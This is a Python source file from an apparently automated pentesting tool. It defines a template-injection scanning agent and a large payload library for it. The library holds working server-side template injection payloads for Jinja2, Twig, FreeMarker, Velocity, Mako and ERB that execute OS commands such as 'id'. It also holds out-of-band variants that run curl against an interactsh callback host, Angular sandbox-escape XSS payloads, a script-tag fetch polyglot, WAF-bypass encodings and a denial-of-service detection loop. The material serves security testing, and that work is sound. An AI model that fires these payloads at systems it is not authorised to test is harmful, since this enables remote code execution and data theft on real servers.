"""CSTIAgent shell — canonical owner (P4-CSTI-shell).

Historical path ``bugtrace.agents.csti_agent`` is a thin re-export.
"""

import asyncio
import aiohttp
import re
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.ui import dashboard
from bugtrace.core.job_manager import JobStatus
from bugtrace.core.event_bus import EventType
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.utils.logger import get_logger
from bugtrace.utils.parsers import XmlParser
from bugtrace.core.llm_client import llm_client
from bugtrace.core.config import settings
from dataclasses import dataclass, field
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
from bugtrace.core.verbose_events import create_emitter

# v2.1.0: Import specialist utilities for payload loading from JSON (if needed)
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data

# v3.2.0: Import TechContextMixin for context-aware CSTI detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

# v3.4: ManipulatorOrchestrator for HTTP attack campaigns
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy

# Single type owner (P4-CSTI): package types — no dual ClassDef here.
from bugtrace.agents.csti.types import CSTIFinding

# V2 Enhancements: WAF & Interactsh Integration
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.tools.interactsh import InteractshClient

logger = get_logger("agents.csti")

from bugtrace.agents.csti.fingerprinter import TemplateEngineFingerprinter


PAYLOAD_LIBRARY = {
    # ================================================================
    # UNIVERSAL ARITHMETIC PROBES (work on most engines)
    # ================================================================
    "universal": [
        # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
        "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{1000003*1000003}}${1000003*1000003}<% 1000003*1000003 %>",
        "{{1000003*1000003}}",
        "${1000003*1000003}",
        "<%= 1000003*1000003 %>",
        "#{1000003*1000003}",
        "[[1000003*1000003]]",
        "{1000003*1000003}",
        "{{7*'7'}}",
        "${7*'7'}",
    ],

    # ================================================================
    # ANGULAR-SPECIFIC (CSTI) - IMPROVED 2026-01-30
    # ================================================================
    "angular": [
        # SIMPLE ARITHMETIC (highest priority - works on most Angular apps)
        "{{1000003*1000003}}",
        "{{7*'7'}}",
        "{{49}}",  # Direct number to test reflection
        # Constructor-based
        "{{constructor.constructor('return 1000003*1000003')()}}",
        "{{$on.constructor('return 1000003*1000003')()}}",
        "{{[].pop.constructor('return 1000003*1000003')()}}",
        "{{[].push.constructor('return 1000003*1000003')()}}",
        # Error-based detection
        "{{a]}}",
        "{{'a]'}}",
        # Sandbox bypasses (Angular 1.x - ginandjuice.shop uses older Angular)
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(document.domain)');}}",
        "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)');}}",
        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(document.domain)\"].sort(toString.constructor);}}",
        # More sandbox bypasses for different Angular versions
        "{{$eval.constructor('return 1000003*1000003')()}}",
        "{{$parse.constructor('return 1000003*1000003')()}}",
        # ------------------------------------------------------------
        # DOUBLE-QUOTE VARIANTS (for servers that error on single quotes)
        # ginandjuice.shop returns 500 on single quotes, but accepts double quotes
        # ------------------------------------------------------------
        '{{constructor.constructor("return 1000003*1000003")()}}',
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("return 1000003*1000003")()}}',
        '{{[].pop.constructor("return 1000003*1000003")()}}',
        '{{[].push.constructor("return 1000003*1000003")()}}',
        '{{$eval.constructor("return 1000003*1000003")()}}',
        '{{$parse.constructor("return 1000003*1000003")()}}',
    ],

    # ================================================================
    # VUE-SPECIFIC (CSTI)
    # ================================================================
    "vue": [
        "{{1000003*1000003}}",
        "{{constructor.constructor('return 1000003*1000003')()}}",
        "{{_c.constructor('return 1000003*1000003')()}}",
    ],

    # ================================================================
    # JINJA2-SPECIFIC (SSTI)
    # ================================================================
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__init__.__globals__}}",
        "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # OOB (with placeholder)
        "{{config.__class__.__init__.__globals__['os'].popen('curl {{INTERACTSH}}').read()}}",
        # Blind detection
        "{% for x in range(100000000) %}a{% endfor %}",  # DoS-based detection
    ],

    # ================================================================
    # TWIG-SPECIFIC (SSTI)
    # ================================================================
    "twig": [
        "{{1000003*1000003}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.all|join(',')}}",
        # OOB
        "{{['curl {{INTERACTSH}}']|filter('exec')}}",
    ],

    # ================================================================
    # FREEMARKER-SPECIFIC (SSTI)
    # ================================================================
    "freemarker": [
        "${1000003*1000003}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # OOB
        "${\"freemarker.template.utility.Execute\"?new()(\"curl {{INTERACTSH}}\")}",
    ],

    # ================================================================
    # VELOCITY-SPECIFIC (SSTI)
    # ================================================================
    "velocity": [
        "#set($x=1000003*1000003)$x",
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('id')",
        # OOB
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('curl {{INTERACTSH}}')",
    ],

    # ================================================================
    # MAKO-SPECIFIC (SSTI)
    # ================================================================
    "mako": [
        "${1000003*1000003}",
        "${self.module.cache.util.os.popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
        # OOB
        "<%import os%>${os.popen('curl {{INTERACTSH}}').read()}",
    ],

    # ================================================================
    # ERB-SPECIFIC (Ruby)
    # ================================================================
    "erb": [
        "<%= 1000003*1000003 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        # OOB
        "<%= system('curl {{INTERACTSH}}') %>",
    ],

    # ================================================================
    # POLYGLOTS (work across multiple engines)
    # ================================================================
    "polyglots": [
        "{{1000003*1000003}}${1000003*1000003}<%= 1000003*1000003 %>#{1000003*1000003}",
        "${{1000003*1000003}}",
        "{{1000003*1000003}}[[1000003*1000003]]",
    ],

    # ================================================================
    # WAF BYPASS VARIANTS (encoded versions)
    # ================================================================
    "waf_bypass": [
        # URL encoded
        "%7b%7b1000003*1000003%7d%7d",
        # Unicode
        "\\u007b\\u007b1000003*1000003\\u007d\\u007d",
        # Double encoded
        "%257b%257b1000003*1000003%257d%257d",
        # HTML entities
        "&#123;&#123;1000003*1000003&#125;&#125;",
        # Mixed case (for JS engines)
        "{{1000003*1000003}}",
    ],
}

# =========================================================================
# VICTORY HIERARCHY: Early exit based on payload impact
# =========================================================================

HIGH_IMPACT_INDICATORS = [
    "id=",           # RCE: id command output
    "uid=",          # RCE: uid from id
    "whoami",        # RCE: whoami output
    "/etc/passwd",   # File read
    "root:",         # passwd content
    "__globals__",   # Python internals access
    "os.popen",      # Command execution
    "subprocess",    # Command execution
    "java.lang.Runtime" # Java RCE
]

MEDIUM_IMPACT_INDICATORS = [
    "1000006000009",            # Arithmetic evaluation (1000003*1000003)
    "Config",        # Config access
    "SECRET",        # Secret key access
]

# Parámetros más propensos a CSTI/SSTI
HIGH_PRIORITY_PARAMS = [
    # Template-related
    "template", "tpl", "view", "layout", "page",
    # Content rendering
    "content", "text", "body", "message", "msg",
    "title", "subject", "name", "description",
    # Dynamic
    "preview", "render", "output", "display",
    # Input
    "input", "value", "data", "query", "q", "search",
    # File/Path
    "file", "path", "include", "partial",
    # ADDED (2026-01-30): Common vulnerable params from real-world findings
    "category", "filter", "sort", "lang", "locale", "theme",
]

from bugtrace.agents.csti_shell.misc_flow import CSTIMiscMixin
from bugtrace.agents.csti_shell.discovery_flow import CSTIDiscoveryMixin
from bugtrace.agents.csti_shell.validation_flow import CSTIValidationMixin
from bugtrace.agents.csti_shell.queue_flow import CSTIQueueMixin
from bugtrace.agents.csti_shell.escalation_flow import CSTIEscalationMixin
from bugtrace.agents.csti_shell.report_flow import CSTIReportMixin

class CSTIAgent(CSTIMiscMixin, CSTIDiscoveryMixin, CSTIValidationMixin, CSTIQueueMixin, CSTIEscalationMixin, CSTIReportMixin, TechContextMixin, BaseAgent):
    """
    CSTI Agent V2 - Intelligent Template Injection Specialist.

    Feature Set:
    - Distinctive Arithmetic Proof (1000003*1000003=1000006000009)
    - WAF Detection & Q-Learning Bypass (UCB1)
    - Template Engine Fingerprinting
    - Targeted & Polyglot Payloads
    - Blind SSTI Detection via Interactsh (OOB)
    - Context-aware technology stack integration (v3.2)
    """
    
    def __init__(self, url: str, params: List[Dict] = None, report_dir: Path = None, event_bus=None):
        super().__init__(
            name="CSTIAgent",
            role="Template Injection Specialist",
            event_bus=event_bus,
            agent_id="csti_agent"
        )
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        self._detected_waf = None
        self._waf_confidence = 0.0
        self.interactsh = None
        self.interactsh_url = None
        self._max_impact_achieved = False

        # Load technology profile for framework-specific CSTI attacks
        from bugtrace.utils.tech_loader import load_tech_profile
        self.tech_profile = load_tech_profile(self.report_dir)

        # Queue consumption mode (Phase 20)
        self._queue_mode = False

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # Agent-specific fingerprint

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._csti_prime_directive: str = ""




    

    # =========================================================================
    # FINDING VALIDATION: CSTI-specific validation (Phase 1 Refactor)
    # =========================================================================


































































    # =========================================================================
    # WET → DRY Two-Phase Processing (Phase A: Deduplication, Phase B: Exploitation)
    # =========================================================================






    # =========================================================================
    # v3.4: 6-Level CSTI Escalation Pipeline
    # =========================================================================



    # ===== ESCALATION HELPER METHODS =====









    # ===== ESCALATION LEVEL IMPLEMENTATIONS =====









    # =========================================================================
    # Queue Consumption Mode (Phase 20)
    # =========================================================================


        # Method ends - agent terminates ✅










